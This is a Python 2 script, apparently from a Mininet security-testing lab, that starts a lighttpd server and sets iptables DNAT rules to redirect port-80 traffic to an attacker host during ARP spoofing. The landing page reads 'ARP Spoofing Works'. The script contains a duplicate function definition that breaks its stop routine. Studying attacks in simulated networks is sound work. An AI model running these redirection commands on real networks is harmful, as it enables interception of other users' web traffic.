#################################################################################
# Trusted Agent Web Server                                                      #
# Author: Jacob Cox (jcox70@ece.gatech.edu)                                     #
# webServer.py save to /mininet/examples/SecFrameTest/webServer.py                                           #
# Date: 4 May 2016
################################################################################

###################################################################
##                     Requirements
###################################################################
"""
1) install lighttpd web server
    a) sudo apt-get install lighttpd
2) modify the lighttpd.conf file with following:
    a) cd /etc/lighttpd
    b) edit /etc/lighttpd/lighttpd.conf (following is all you need)
        server.document-root = "/var/www/index.html" 
        mimetype.assign = (
          ".html" => "text/html", 
          ".txt" => "text/plain",
          ".jpg" => "image/jpeg",
          ".png" => "image/png"
          
3) setup index.html
    a. cd /var/www
    b. touch index.html (if it doesn't exist already
    c. edit file
    <html>
      <head>
        <title>ARP Spoofing Works</title>
      </head>
      <body bgcolor=white>
              <h1>ARP Spoofing Works</h1>
            <p>If you landed here, it is because of ARP spoofing. </p>
      </body>
"""
######################################################################

import sys
from subprocess import call
import os

def turnOnWebServer():
    os.system('/etc/init.d/lighttpd start')

def killWebServer():
    os.system('/etc/init.d/lighttpd stop')

def enableIPForwarding():
    #Common command to enable IP forwarding on linux systems
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def setWebPage(interface, attackIP):
    #Iptable code (minor changes) comes from:
    #https://blogs.oracle.com/ksplice/entry/hijacking_http_traffic_on_your
    os.system('iptables -t nat --flush')
    os.system('iptables --zero')
    os.system('iptables -A FORWARD --in-interface %s -j ACCEPT' %interface)
    os.system('iptables -t nat --append POSTROUTING --out-interface '\
          'h1-eth0 -j MASQUERADE')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 '\
          '--jump DNAT --to-destination %s' %attackIP)

def killWebServer(attackIP):
    killWebServer()
    os.system('sudo iptables -t nat -D PREROUTING -p tcp --dport ' \
              '80 -j NETMAP --to %s' %attackIP)
    os.system('iptables --table nat --flush')

def renderWeb(interface, attackIP):
    turnOnWebServer()
    enableIPForwarding()
    setWebPage(interface, attackIP)

def getVectors():
    interface = 'h1-eth1'
    yourIP='10.0.0.1' #raw_input('Enter Your IP Address: ')
    return interface, yourIP

def main():
    #nmap()
    os.system('hostname -I')
    print "Your IP address is: "
    print "Starting Web Server"
    choice = raw_input('1) Start Web Server or 2) Stop \n')   

    if choice == '1':
        interface, serverIP = getVectors()
        renderWeb(interface, serverIP)
    elif choice == '2':
        serverIP = '10.0.0.1' #raw_input("Enter your IP")
        killWebServer(serverIP)
        print "don't forget netstat -tulp  and kill process"
    else:
        print "wrong value"
     

main()
